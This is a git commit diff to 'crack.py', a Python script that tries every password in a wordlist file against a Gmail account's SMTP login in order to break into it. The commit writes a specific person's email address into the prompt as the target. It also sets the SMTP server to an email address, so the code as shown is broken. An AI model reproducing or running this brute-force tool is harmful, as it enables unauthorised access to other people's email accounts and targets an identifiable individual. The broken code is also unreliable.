27f5bd27802ff78c6c7b50c3b96380eb5490a7b1
shoron11 <75226264+shoron11@users.noreply.github.com>
2020-11-30 05:11:51 +0600

    crack.py

--- crack.py
+++ crack.py
@@ -2,12 +2,12 @@ import smtplib
 
 
 def main():
-    smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
+    smtpserver = smtplib.SMTP("jubayershoron@gmail.com", 587)
     smtpserver.ehlo()
     smtpserver.starttls()
 \
-    user = raw_input("Alpha : Enter the target's email address: ")
-    passwfile = raw_input("Alpha : Enter the password file name: ")
+    user = raw_input("Alpha : Enter the target's email address: miashapon590@gmail.com")
+    passwfile = raw_input("Alpha : Enter the password file name:crack.py ")
     passwfile = open(passwfile, "r")
 
     for password in passwfile:
